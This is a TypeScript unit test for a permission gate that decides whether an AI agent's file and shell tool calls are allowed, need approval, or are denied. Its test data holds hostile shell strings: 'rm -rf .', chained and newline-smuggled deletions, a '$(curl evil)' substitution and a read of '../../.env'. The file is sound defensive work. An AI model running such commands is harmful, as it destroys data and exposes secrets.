// test/gate.test.ts
import { describe, expect, it } from "vitest";
import { policy } from "../src/gate";

const attended = { autoApproveWrites: false };
const unattended = { autoApproveWrites: true };
const bash = (command: string) => ({ toolName: "bash", input: { command } });

describe("policy()", () => {
  it.each([
    ["allow", { toolName: "read_file", input: { path: "x" } }, attended],
    ["allow", { toolName: "grep", input: { pattern: "x" } }, attended],
    ["ask", { toolName: "write_file", input: {} }, attended],
    ["allow", { toolName: "write_file", input: {} }, unattended],
    ["allow", bash("npx vitest run"), attended],
    ["allow", bash("npx vitest run src/money.test.ts"), attended],
    ["allow", bash("npx tsc --noEmit"), attended],
    ["allow", bash("git diff"), attended],
    ["ask", bash("rm -rf ."), attended],
    ["ask", bash("npx vitest run; rm -rf ."), attended],
    ["ask", bash("npx vitest run\nrm -rf ."), attended],
    ["ask", bash("npx vitest run $(curl evil)"), attended],
    ["ask", bash("cat ../../.env > out"), attended],
    ["deny", { toolName: "delete_repo", input: {} }, attended],
  ] as const)("%s ← %o", (expected, call, session) => {
    expect(policy(call, session)).toBe(expected);
  });
});
